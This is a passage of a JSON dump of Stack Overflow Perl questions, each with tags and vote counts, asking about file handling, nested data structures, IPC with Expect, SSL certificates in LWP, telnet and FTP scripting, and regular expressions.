plugin, </p>\n\n<p>am using straberry perl, </p>\n\n<p>tell me where i find the excel plugin for PERL, and where  shoukld paste that excel plugin</p>\n"},{"tags":["perl","file-handling","file-handles"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12633743,"title":"Read and Write to a file in perl","body":"<pre><code>    this\n    is just\n    an example.\n</code></pre>\n\n<p>Lets assume the above is <strong>out.txt</strong>. I want to read <strong>out.txt</strong> and write onto the same file.</p>\n\n<pre><code>    &lt;Hi &gt;\n    &lt;this&gt;\n    &lt;is just&gt;\n    &lt;an example.&gt;\n</code></pre>\n\n<p>Modified <strong>out.txt</strong>.\nI want to add tags in the beginning and end of some lines. \nAs I will be reading the file several times I cannot keep writing it onto a different file each time.</p>\n\n<p><strong>EDIT 1</strong>\nI tried using <code>\"+&lt;\"</code> but its giving an output like this :</p>\n\n<pre><code>Hi\nthis\nis just\nan example.\n&lt;Hi &gt;\n&lt;this&gt;\n&lt;is just&gt;\n&lt;an example.&gt;\n **out.txt**\n</code></pre>\n\n<p><strong>EDIT 2</strong>\n Code for reference : </p>\n\n<pre><code>open(my $fh, \"+&lt;\", \"out.txt\");# or die \"cannot open &lt; C:\\Users\\daanishs\\workspace\\CCoverage\\out.txt: $!\";\n     while(&lt;$fh&gt;)\n     {\n        $s1 = \"&lt;\";\n        $s2 = $_;\n        $s3 = \"&gt;\";\n        $str = $s1 . $s2 . $s3;\n        print $fh \"$str\";\n     }\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12635464,"title":"Traversing the hash of hash of array","body":"<p>Here is by code : </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse Data::Dumper;\n\nmy $var = { \n    Cars =&gt; {\n        cars_name =&gt; [\n            \"GT500\", \n            \"Beetle\",\n            \"P1800\"\n        ]\n    },           \n    Bikes =&gt; {\n        Bikes_name =&gt; [\n            \"Pulsar\",\n            \"Discover\",\n            \"CBR\"\n        ]\n    }\n};\n\n#Traversing the hash of hash of array\nprint \"$var\\n\";\nforeach my $k1 (keys %{$var}) {\n\n    print \"$k1\\n\";\n    print $var-&gt;$k1;\n    #foreach my $k2 (keys %{$var-&gt;$k1}) {\n\n         #print\"$k2\\n\";\n    #}   \n}   \n</code></pre>\n\n<p>Whenever i am trying to print cars_name and Bikes_name , i am getting an <strong>error message saying the Can't call method Cars on Unblessed reference.</strong> I am not able to figure it out where am i doing mistake. Well, by mine understanding  this <code>print $var-&gt;$k1</code>; line creating a prob. So please can any body help me out of this. </p>\n\n<p>Thanks</p>\n"},{"tags":["perl","data-dumper"],"answer_count":3,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":410,"score":3,"question_id":908741,"title":"How do I control the variable names in Perl's Data::Dumper?","body":"<p>I've got this simple Perl script:</p>\n\n<pre><code>#! /usr/bin/perl -w\n\nuse strict;\nuse Data::Dumper;\n\nmy %foo = ( 'abc' =&gt; 1 );\n\nprint Dumper(\\%foo);\n</code></pre>\n\n<p>It outputs:</p>\n\n<pre><code>$VAR1 = {\n          'abc' =&gt; 1\n        };\n</code></pre>\n\n<p>How do I make it output this instead?</p>\n\n<pre><code>%foo = (\n         'abc' =&gt; 1\n       );\n</code></pre>\n"},{"tags":["windows","perl","compiler","module","executable"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12607889,"title":"Perl compiler for Windows","body":"<p>I'm trying to compile a Perl script on Windows 7 x64 SP1 so that it can run on a computer that does not have Perl installed. I tried tinyperl, Perl2Exe, perl dev kit but I can't compile the file. I thought I'd include the modules in the executable that I need but do not know how to do it. Can someone can help me?</p>\n"},{"tags":["perl","unix","sed","awk"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":12625117,"title":"Read and parse multiple text files","body":"<p>Can anyone suggest a simple way of achieving this. I have several files which ends with extension .vcf . I will give example with two files\nIn the below files, we are interested in </p>\n\n<p>File 1: </p>\n\n<pre><code>38  107 C   3   T   6   C/T\n38  241 C   4   T   5   C/T\n38  247 T   4   C   5   T/C\n38  259 T   3   C   6   T/C\n38  275 G   3   A   5   G/A\n38  304 C   4   T   5   C/T\n38  323 T   3   A   5   T/A\n</code></pre>\n\n<p>File2:</p>\n\n<pre><code>38  107 C   8   T   8   C/T\n38  222 -   6   A   7   -/A\n38  241 C   7   T   10  C/T\n38  247 T   7   C   10  T/C\n38  259 T   7   C   10  T/C\n38  275 G   6   A   11  G/A\n38  304 C   5   T   12  C/T\n38  323 T   4   A   12  T/A\n38  343 G   13  A   5   G/A\n</code></pre>\n\n<p>Index file :</p>\n\n<pre><code>107\n222\n241\n247\n259\n275\n304\n323\n343\n</code></pre>\n\n<p>The index file is created based on unique positions from file 1 and file 2. I have that ready as index file. Now i need to read all files and parse data according to the positions here and write in columns. \nFrom above files, we are interested in 4th (Ref) and 6th (Alt) columns. \nAnother challenge is to name the headers accordingly. So the output should be something like this.</p>\n\n<pre><code>Position    File1_Ref   File1_Alt   File2_Ref   File2_Alt\n107 3   6   8   8\n222         6   7\n241 4   5   7   10\n247 4   5   7   10\n259 3   6   7   10\n275 3   5   6   11\n304 4   5   5   12\n323 3   5   4   12\n343         13  5\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12635497,"title":"How to set the cross platform interpreter path?","body":"<p>I would like my scripts works on Windows and UNIX system, so I want some code as blew(just a sample, not work)</p>\n\n<pre><code>if $^O eq 'MSWin32' {\n#!/c:/perl/bin/perl.exe\n}\nelse { / non-windows system\n#!/usr/local/bin/perl\n}\n</code></pre>\n\n<p>is there any way to do this in perl? it seems the #! line must be the first line of a perl script, so this is impossible?</p>\n"},{"tags":["arrays","perl","hash","grep"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12635574,"title":"How do I filter out empty hashes from an array in perl?","body":"<p>I have an array of hashes like so:</p>\n\n<pre><code>my @array = [\n             {1 =&gt; \"Test1\"},\n             {},\n             {1 =&gt; \"Test2\"},\n            ];\n</code></pre>\n\n<p>I try to filter out the {} from this array so that the end result is an array without any {} like so:</p>\n\n<pre><code>my @array = [\n             {1 =&gt; \"Test1\"},\n             {1 =&gt; \"Test2\"},\n            ];\n</code></pre>\n\n<p>I tried using something like this but it doesn't work:</p>\n\n<pre><code>my @new_array = grep(!/{}/, @array);\n</code></pre>\n"},{"tags":["perl","multidimensional-array"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":79,"score":-1,"question_id":12392127,"title":"Building and printing a multidimensional list in Perl without looping","body":"<p>The top answer in this post: <a href=\"http://stackoverflow.com/questions/317310/how-can-i-create-multidimensional-arrays-in-perl\">How can I create a multidimensional array in Perl?</a> suggests building a multi-dimensional array as follows:</p>\n\n<pre><code>my @array = ();\nforeach my $i ( 0 .. 10 ) {\n  foreach my $j ( 0 .. 10 ) {\n    push @{ $array[$i] }, $j;\n  }\n}\n</code></pre>\n\n<p>I am wondering if there is a way of building the array more compactly and avoiding the nested loop, e.g. using something like:</p>\n\n<pre><code>my @array = ();\nmy @other_array = (0 ... 10);\nforeach my $i ( 0 .. 10 ) {\n    $array[$i] = @other_array; # This does not work in Perl\n  }\n}\n</code></pre>\n\n<p>Does Perl support any syntax like that for <strong>building</strong> multi-dimensional arrays without nested looping?</p>\n\n<p>Similarly, is there a way to <strong>print</strong> the multidimensional array without (nested) looping?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12630838,"title":"How do can search a scalar variable for a pattern and add something before and after match?","body":"<p>Here is my scalar:</p>\n\n<pre><code>my $var = \"foo1\";\n</code></pre>\n\n<p>and here is what I tried to do:</p>\n\n<pre><code>$var =~ s/[0-9]/_[0-9]/;\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>foo_[0-9]\n</code></pre>\n\n<p>Expected Result:</p>\n\n<pre><code>foo_1\n</code></pre>\n\n<p>It would be great if you could answer for finding <code>foo</code> and adding the underscore after the match, and also finding <code>1</code> and adding the underscore before. </p>\n\n<pre><code>$var = s/foo/something/\n</code></pre>\n\n<p>and</p>\n\n<pre><code>$var = s/[0-9]/something/\n</code></pre>\n\n<p>Thanks in advance </p>\n"},{"tags":["perl","ipc","pipe","expect"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12632215,"title":"Communicating with a program using Perl Expect","body":"<p>Im trying to use Expect to talk to a long running interactive process.  I am using cat -un to simulate the process.  My code is as follows:</p>\n\n<pre><code>    #!/usr/bin/perl \n\n    use strict; \n    use warnings; \n    use Expect; \n\n    my $timeout = 4000; \n\n    my $exp = Expect-&gt;spawn(\"cat -un\"); \n\n    my $text = &lt;STDIN&gt;; \n    $exp-&gt;send($text); \n\n    $text = &lt;STDIN&gt;; \n    $exp-&gt;send($text); \n\n    $exp-&gt;expect(undef); # Forever until EOF \n    $exp-&gt;expect($timeout); # For a few seconds \n    $exp-&gt;expect(0); \n\n    $text = &lt;STDIN&gt;; \n    $exp-&gt;send($text); \n\n    $exp-&gt;expect(undef); # Forever until EOF \n    $exp-&gt;expect($timeout); # For a few seconds \n    $exp-&gt;expect(0); \n</code></pre>\n\n<p>I press the first string + enter and get no output (obviously).  I enter the second string and press enter and stdout from cat -un dumps to the screen.  My third string does not yield any output, yet I would like it to dump stdout to the screen as well.</p>\n\n<p>My goal is to communicate with an interactive process that puts text on the screen (asking the user to select from a menu), then have the user enter a response and send it to the process (which generates more output and more menus).</p>\n\n<p>Expect seems to be the easiest way to do this.  Please assit me.</p>\n"},{"tags":["html","perl","mediawiki","converter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12630206,"title":"How do I use the Perl Text-MediawikiFormat to convert mediawiki to xhtml?","body":"<p>On an Ubuntu platform, I installed the nice little perl script</p>\n\n<pre><code>libtext-mediawikiformat-perl - Convert Mediawiki markup into other text formats\n</code></pre>\n\n<p>which is available <a href=\"http://search.cpan.org/~dprice/Text-MediawikiFormat-0.05/lib/Text/MediawikiFormat.pm\" rel=\"nofollow\">on cpan</a>. I'm not familiar with perl and have no idea how to go about using this library to write a perl script that would convert a mediawiki file to an html file.  e.g. I'd like to just have a script I can run such as</p>\n\n<pre><code>./my_convert_script input.wiki &gt; output.html\n</code></pre>\n\n<p>(perhaps also specifying the base url, etc), but have no idea where to start.  Any suggestions?</p>\n"},{"tags":["perl","process","ipc","pipe"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12631920,"title":"Perl: Communicating with an interactive process (IPC)","body":"<p>I am trying to communicate with an using perl interactive program.  By interactive I mean the program puts some output to stdout, then waits for stdin.  Based on the command the user enters in stdin, more text is outputted to stdout, and this goes on and on.  I found the following example online and tried to modify it:\n        #!/usr/bin/perl </p>\n\n<pre><code>    use IPC::Open2; \n    local (*Reader, *Writer); \n    $pid = open2(\\*Reader, \\*Writer, \"./program arg1\"); \n    my $text;      \n\n    while (&lt;Reader&gt;) { \n            print $_; \n    } \n\n    print Writer \"n\\n\"; \n\n    while (&lt;Reader&gt;) {\n            print $_;\n    }\n\n    close Writer;\n    close Reader;\n    waitpid($pid, 0);\n</code></pre>\n\n<p>The program just sits there and does not output anything to stdout until I press CTRL+C.  Even more so the second reader loop does not print anything.  I am trying to emulate a user launching the program, printing the text the program shows to the perl script's stdout, simulating pressing the \"n\" key, and then printing more text.  This is just a test but I would really like the user using my perl script to be able to enter their own command.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12616128,"title":"Find value in a html file using HTML::TreeBuilder","body":"<p>Below is my data in html file. I want to find the values in the html file using \"HTML::TreeBuilder\"</p>\n\n<pre><code>&lt;table id=\"stats\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n&lt;tbody&gt;\n    &lt;tr class=\"row-even\"&gt;\n        &lt;td class=\"stats_left\"&gt;Main Domain&lt;/td&gt;\n        &lt;td class=\"stats_right\"&gt;&lt;b&gt;myabcab.com&lt;/b&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr class=\"row-odd\"&gt;\n        &lt;td class=\"stats_left\"&gt;Home Directory&lt;/td&gt;\n        &lt;td class=\"stats_right\"&gt;/home/abc&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr class=\"row-even\"&gt;\n        &lt;td class=\"stats_left\"&gt;Last login from&lt;/td&gt;\n        &lt;td class=\"stats_right\"&gt;22.32.232.223&amp;nbsp;&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr class=\"row-odd\"&gt;\n        &lt;td class=\"stats_left\"&gt;Disk Space Usage&lt;/td&gt;\n        &lt;td class=\"stats_right\"&gt;30.2 / &amp;#8734; MB&lt;br&gt;\n        &lt;div class=\"stats_progress_bar\"&gt;\n        &lt;div class=\"cpanel_widget_progress_bar\" title=\"0%\"\n            style=\"position: relative; width: 100%; height: 100%; padding: 0px; margin: 0px; border: 0px\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"cpanel_widget_progress_bar_percent\" style=\"display: none\"&gt;0&lt;/div&gt;\n        &lt;/div&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr class=\"row-even\"&gt;\n        &lt;td class=\"stats_left\"&gt;Monthly Bandwidth Transfer&lt;/td&gt;\n        &lt;td class=\"stats_right\"&gt;0 / &amp;#8734; MB&lt;br&gt;\n        &lt;div class=\"stats_progress_bar\"&gt;\n        &lt;div class=\"cpanel_widget_progress_bar\" title=\"0%\"\n            style=\"position: relative; width: 100%; height: 100%; padding: 0px; margin: 0px; border: 0px\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"cpanel_widget_progress_bar_percent\" style=\"display: none\"&gt;0&lt;/div&gt;\n        &lt;/div&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/tbody&gt;\n  &lt;/table&gt;\n</code></pre>\n\n<p>How can I find \"Disk Usage space\" value using \"HTML::TreeBuilder\". I have many tds with same classes  from above code,</p>\n"},{"tags":["perl","imagemagick","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12624875,"title":"Perl Image::Magic Watermark Error","body":"<p>I'm trying to add a watermark to a image using Image::Magic, bot I keep on getting this error</p>\n\n<pre><code>Can't call method \"Read\" on an undefined value at ImageUploader.pl line xxx.\n</code></pre>\n\n<p>Witch is:</p>\n\n<pre><code>$Logo-&gt;Read('../Data/Images/Watermark.png');\n</code></pre>\n\n<p>in the code below and can not figure it out the path is right and the file exists.</p>\n\n<p>Any ideas?</p>\n\n<pre><code>use Image::Magick;\n\nmy $NewImage = Image::Magick-&gt;new;\n$NewImage-&gt;Read(\"../Data/Temp/Images/$SaveAs$Extension\");\n\nmy ($Width,$Height) = $NewImage-&gt;Get('width','height'); # find dimensions\n\nmy $ResizedWidth = 275;\nmy $ResizedHeight = 450;\n\nmy $MeduimThumbnailWidth = 300;\nmy $MeduimThumbnailHeight = 300;\n\n\nif($Height &gt;= $ResizedHeight){\nmy $ResizedHeight = int($Height * ($ResizedWidth / $Width));\n\n$Logo-&gt;Read('../Data/Images/Watermark.png');\n$NewImage-&gt;Composite(compose=&gt;'blend', blend=&gt;'50x50', x=&gt;'50', y=&gt;'50', image=&gt;$Logo,);\n\n$NewImage-&gt;Resize(width=&gt;$ResizedWidth, height=&gt;$ResizedHeight);\n$NewImage-&gt;Write(\"../Data/Images/$URL/$SaveAs\\_lrg$Extension\");\n}else{\n$NewImage-&gt;Write(\"../Data/Images/$URL/$SaveAs\\_lrg$Extension\");\n}\n</code></pre>\n"},{"tags":["perl","unix","sed","awk","command"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":121,"score":-7,"question_id":12569570,"title":"Command \"Print All Lines Starting With\"","body":"<p>I am looking for a perl command where lines starting with a string are printed. For example, if I wanted to print all lines starting with \"1234\", what would that command look like? Sed? Awk? Grep?</p>\n"},{"tags":["perl","ssl","pkcs#12"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12627577,"title":"How can I use a PKCS12 ssl certificate with newer LWP?","body":"<p>I'm having difficulty getting a PKCS12 certificate to work using new LWP (6.x). Basically, this code works under perl5.8.8 and old <a href=\"http://metacpan.org/module/Crypt%3a%3aSSLeay\" rel=\"nofollow\">Crypt::SSLeay</a> (version 0.57) and <a href=\"https://metacpan.org/release/libwww-perl\" rel=\"nofollow\">LWP</a> (version 5.826):</p>\n\n<pre><code>local $ENV{HTTPS_PKCS12_PASSWORD} = $sslPassword;\nlocal $ENV{HTTPS_PKCS12_FILE} = $pkcs12_cert;\nmy $response = LWP::UserAgent-&gt;new-&gt;request(POST($url, Content =&gt; $content));\n</code></pre>\n\n<p>...but does not under perl5.14.2 and latest versions of Crypt::SSLeay 0.64) and LWP (6.03).</p>\n\n<p>By doesn't work, I mean that I get an HTTP::Response object back like:</p>\n\n<pre><code>bless( {\n     '_content' =&gt; 'Can\\'t connect to host:port\n',\n     '_rc' =&gt; 500,\n     '_headers' =&gt; bless( { \n                            'client-warning' =&gt; 'Internal response',\n                            'client-date' =&gt; 'Thu, 27 Sep 2012 18:28:34 GMT',\n                            'content-type' =&gt; 'text/plain'\n                          }, 'HTTP::Headers' ),\n     '_msg' =&gt; 'Can\\'t connect to host:port',\n     '_request' =&gt; ...\n)\n</code></pre>\n\n<p>I understand that much ssl-related code has changed in LWP lately; is PKCS12 support known to still work?  Should I be setting different variables/options in order to get the certificate and password to be picked up?</p>\n\n<p>I've also tried passing this to LWP::UserAgent->new with no luck:</p>\n\n<pre><code>ssl_opts =&gt; {\n    SSL_use_cert =&gt; 1,\n    SSL_cert_file =&gt; $pkcs12_cert,\n    SSL_passwd_cb =&gt; sub { $sslPassword },\n}\n</code></pre>\n\n<hr>\n\n<p>Follow-up: I converted the PKCS12 cert to a PEM:</p>\n\n<pre><code>openssl pkcs12 -in my_pkcs12.p12 -out mycert.pem -clcerts -nokeys\nopenssl pkcs12 -in my_pkcs.p12 -out mykey.pem -nocerts\n&lt;passphrase entered&gt;\n</code></pre>\n\n<p>and can use the new files via:</p>\n\n<pre><code>curl -k --cert mycert.pem --key mykey.pem --pass passphrase --cert-type PEM https://url\n</code></pre>\n\n<p>...and set these environment variables in the test script:</p>\n\n<pre><code>$ENV{HTTPS_CERT_FILE} = 'mycert.pem';\n$ENV{HTTPS_KEY_FILE}  = 'mykey.pem';\n</code></pre>\n\n<p>...and <em>that</em> works as well under older LWP, and again does not work under new LWP.. so at least it is not something specific to PKCS12 certs at issue, but rather something more fundamental in how SSL handling has been changed internally.</p>\n"},{"tags":["perl","carriage-return","hidden-characters"],"answer_count":9,"favorite_count":0,"up_vote_count":10,"down_vote_count":0,"view_count":29177,"score":10,"question_id":650743,"title":"In Perl, how to do you remove ^M from a file?","body":"<p>I have a script that is appending new fields to an existing CSV, however ^M characters are appearing at the end of the old line so the new fields end up on a new row instead of the same one. How do you remove the ^M characters from a csv file using Perl?.</p>\n"},{"tags":["windows","perl","ssl","random"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12630011,"title":"How to setup Net::SSLeay to use EGDW?","body":"<p>I have setup EGDW to run on my local windows system.</p>\n\n<pre><code>&gt; perl egd-0.9\\examples\\egc.pl localhost:708 read 10\ngot 10 bytes of entropy: 892e86e03ee0bf749fc7\n</code></pre>\n\n<p>Can someone help me with Net::SSLeay configuration to use it?</p>\n\n<p>I changed P5\\lib\\Net\\SSLeay.pm: <code>$Net::SSLeay::random_device = 'localhost:708';</code> but it doesn't work.</p>\n\n<p>I also added environment variable <code>set EGD_PATH=localhost:708</code> and it also doesn't work.</p>\n\n<p>This is the test script:</p>\n\n<pre><code>use Net::SSLeay;\n$Net::SSLeay::trace=1; \nprint Net::SSLeay::randomize();\n</code></pre>\n"},{"tags":["linux","perl","sockets","telnet","tcpdump"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12596014,"title":"telnet automation script fails sometimes","body":"<p>I am running following simple telnet script which just logs into a machine and exits.</p>\n\n<p>Same script works fine (goes through 1000 iterations) from one linux server but fails (consistently) from another linux server (fails after say 200 attempts). </p>\n\n<p>In failure case, number of iterations it takes to fail vary but failure is persistent.</p>\n\n<pre><code>#!/usr/bin/perl\nuse Net::Telnet;\n\nmy $loop = 0;\nmy $dumpfile = \"dump.log\";\nmy $inputfile = \"input.log\";\n\nfor ($loop =1; $loop &lt;=1000; $loop++) {\n        print \"===============Loop: $loop =====================\\n\";\n        $telnet = new Net::Telnet ( Timeout=&gt;20, Errmode=&gt;'die');\n        print \"$telnet\\n\";\n        $telnet-&gt;open('sys-007');\n        $telnet-&gt;dump_log($dumpfile);\n        $telnet-&gt;input_log($inputfile);\n        $telnet-&gt;waitfor('/login: $/i');\n        $telnet-&gt;print('root');\n        $telnet-&gt;waitfor('/Password:$/i');\n        $telnet-&gt;print('007');\n        sleep 2;\n        $telnet-&gt;print('exit');\n        print \"=================================================\\n\";\n}\n</code></pre>\n\n<h1>Script exits with:</h1>\n\n<p>pattern match read eof at ./telnettest.pl line 15 (i.e, waitfor('/login: $/i'); Line)</p>\n\n<p>I tried following to see what is going wrong:</p>\n\n<ol>\n<li><p>In the client machine: (sys-007)</p>\n\n<pre><code>tcpdump -nvvv -w test.txt host &lt;Server IP&gt;\n</code></pre></li>\n</ol>\n\n<p>strings test.txt has:</p>\n\n<h1>Successful attempt Log:</h1>\n\n<pre><code>sys-007 (ttyp0)\n^Fl$4\n^!^Fl$\nlogin: \n^Fl$4\n^Fl$4\nroot\n^(^Fl*\nroot\nbP\"u\n^Fl*4\nbP5u\n^.^Fl*\nPassword:\n^Fl*4\n^Fl*4\n007\n^7^Fl6\n^Fl64\n^9^Fl6\nTerminal type? [xterm] \n^Fl64\n^Fl64\nexit\n^Fl&lt;4\n^Fl&lt;\nexit\n^Fl&lt;\n</code></pre>\n\n<h1>Failed Attempt:</h1>\n\n<pre><code>sys-007 (ttyp0)\n*^hn\n+^hn\n</code></pre>\n\n<p>No login: prompt!</p>\n\n<ol>\n<li><p>In server machine: (Linux Server)</p>\n\n<pre><code>[telnet@server]~% netstat --inet -a | grep telnet | grep sys-007\n\nThere are no TIME_WAIT or CLOSE_WAIT sockets.\n</code></pre></li>\n</ol>\n\n<p>Please tell me what should I look for to find out what is going wrong.</p>\n\n<p>Thanks\nRam</p>\n"},{"tags":["perl","cgi","cgi-bin"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":74,"score":0,"question_id":12629737,"title":"Delete all *.jpg in folder","body":"<p>How do I delete  files within a temp folder at only have the .jpg extension.</p>\n\n<p>Here is what I tried;</p>\n\n<pre><code>unlink(\"../httpdocs/Temp/*.jpg);\n</code></pre>\n"},{"tags":["regex","perl","if-statement"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12617979,"title":"OR condition in regular expression in perl","body":"<p>I am trying to write a script which performs an OR function through regular expressions in Perl. I have written a code in which if string contains 'D' or 'E' followed by 'P' it should print \"D or E followed by P\" otherwise \"D or E not followed by P\". Suppose if I give $s = 'ABCDEABCDEPABCDEAB' it should print the else condition but I think my if statement is not working properly. Please help.</p>\n\n<pre><code>my $s = 'ABCDEABCDEPABCDEAB';\nif ($s =~ /D|E(?=P)/) {\n    print \"D or E is followed by P\";\n} \nelse {\n    print \"D or E is not followed by P\";\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12625391,"title":"How do I output a file to a specific directory?","body":"<p>I would like to have the files that I am creating to be output into the directory I created in my perl script. </p>\n\n<p>I can create the directory </p>\n\n<pre><code>use File::Path;\n\n$dir = \"foo/\";\nmkpath($dir);\n</code></pre>\n\n<p>and my files</p>\n\n<pre><code>$FILE = \"output.txt\";\nunless(open $filehandle, \"&gt;\", $FILE){\n  die \"\\nUnable to create $FILE:\\n$!\";\n}\nprintf $filehandle \"writing stuff to my file\\n\";\nprintf $filehandle \"and some more stuff\\n\";\nclose($filehandle);\n</code></pre>\n\n<p>Everything works fine except I was the files to be output into the directory I made earlier in the script. </p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["database","perl","large-files","readlines"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12627527,"title":"Reading a particular line by line number in a very large file","body":"<p>The file will not fit into memory.  It is over 100GB and I want to access specific lines by line number.  I do not want to count line by line until I reach it.</p>\n\n<p>I have read <a href=\"http://docstore.mik.ua/orelly/perl/cookbook/ch08_09.htm\" rel=\"nofollow\">http://docstore.mik.ua/orelly/perl/cookbook/ch08_09.htm</a></p>\n\n<p>When I built an index using the following methods, the line return works up to a certain point.  Once the line number is very large, the line being returned is the same.  When I go to the specific line in the file the same line is returned.  It seems to work for line numbers 1 through 350000 (approximately);</p>\n\n<pre><code> # usage: build_index(*DATA_HANDLE, *INDEX_HANDLE) \n    sub build_index {\n        my $data_file  = shift;\n        my $index_file = shift;\n        my $offset     = 0;\n\n        while (&lt;$data_file&gt;) {\n            print $index_file pack(\"N\", $offset);\n            $offset = tell($data_file);\n        }\n    }\n\n    # usage: line_with_index(*DATA_HANDLE, *INDEX_HANDLE, $LINE_NUMBER)\n    # returns line or undef if LINE_NUMBER was out of range\n    sub line_with_index {\n        my $data_file   = shift;\n        my $index_file  = shift;\n        my $line_number = shift;\n\n        my $size;               # size of an index entry\n        my $i_offset;           # offset into the index of the entry\n        my $entry;              # index entry\n        my $d_offset;           # offset into the data file\n\n        $size = length(pack(\"N\", 0));\n        $i_offset = $size * ($line_number-1);\n        seek($index_file, $i_offset, 0) or return;\n        read($index_file, $entry, $size);\n        $d_offset = unpack(\"N\", $entry);\n        seek($data_file, $d_offset, 0);\n        return scalar(&lt;$data_file&gt;);\n    }\n</code></pre>\n\n<p>I've also tried using the DB_file method, but it seems to take a very long time to do the tie.  I also don't really understand what it means for \"DB_RECNO access method ties an array to a file, one line per array element.\"  Tie does not read the file into the array correct?</p>\n"},{"tags":["linux","perl","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12627193,"title":"unexpected EOF while looking for matching `\"' while trying to set time using ssh","body":"<p>I have a perl script that runs commands on some PCs remotely via SSH. So I want to set the time on all pcs to be the same. The PCs are a linux based system and the perl script uses another .txt file that has the commands to execute. But when I run the perl script, I got the following error :</p>\n\n<pre><code>Command = date --set \"27 SEP 2012 19\n\nsh: -c: line 0: unexpected EOF while looking for matching `\"'\nsh: -c: line 1: syntax error: unexpected end of file\n</code></pre>\n\n<p>The perl script is working fine because I tried another command and it gives the results.\nSo what could cause this error. </p>\n\n<p>The perl code is :</p>\n\n<pre><code>#!/usr/bin/perl\n\nopen (MYFILE,'HostIPWithCmd.txt');\n$i=0;\n @IPs=&lt;MYFILE&gt;;\n foreach (@IPs) {\nchomp;\n($EthIP,$Cmd)= split(\":\");\n if($EthIP!=~ (\"#\"))\n {\n    push(@hostIP,$EthIP);\n    push(@destCmd,$Cmd);\n\n }\n\n else\n {\n   push(@hostIP,\"$EthIP\");\n   push(@destCmd,$Cmd);\n }\n}\n\n$i=0;\n\nforeach my $host (@hostIP)\n{\n   if($host !=~ (\"#\"))\n   {\n\n      my @cmds= split(/,/,$destCmd[$i]);\n      print \"\\n\\nCommands For $host = $destCmd[$i]\\n\";\n\n\n   foreach my $command (@cmds)\n             {\n print \"\\n*************************************\";\n print \"\\nCommand = $command \\n\\n\";\n system(\"ssh -o ConnectTimeout=10 $host $command\");\n\n         }\n\n  print \"\\n***** End Of Host : $host  *****\\n\";\n  print \"************************************************************\\n\\n\";\n      }\n\n $i++;\n}\n</code></pre>\n\n<p>and the HostIPWithCmd.txt</p>\n\n<pre><code>   10.20.146.97:date --set \"27 SEP 2012 19:00:00\"\n</code></pre>\n\n<p>Thanks in advance. </p>\n"},{"tags":["perl","ftp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12627561,"title":"Perl Net::FTP object expected re-use behavior?","body":"<p>I can't seem to re-use a Net::FTP object after using quit.</p>\n\n<p>Is this expected?  I was unable to tell from the documentation (<a href=\"http://search.cpan.org/dist/libnet/Net/FTP.pm\" rel=\"nofollow\">cpan</a>).</p>\n\n<p>As a workaround, I'm creating a new Net::FTP object each time I need to perform a batch of ftp operations.  This seems wasteful.</p>\n\n<p>The following example shows: successful initial login, printing of root directory ls, quit (socket close), login failing with ftp message \"Connection closed\".</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Net::FTP;\n\nmy $hostname = 'foo';\nmy $username = 'bar';\nmy $password = 'baz';\n\n# successful first pass\nmy $ftp = Net::FTP-&gt;new( $hostname ) or die \"cannot connect to $hostname: $@\";\n$ftp-&gt;login( $username, $password ) or die \"cannot login: \", $ftp-&gt;message;\nmap { print \"ls_output: $_\\n\" } $ftp-&gt;ls; # success\n$ftp-&gt;quit or die \"cannot close connection: \", 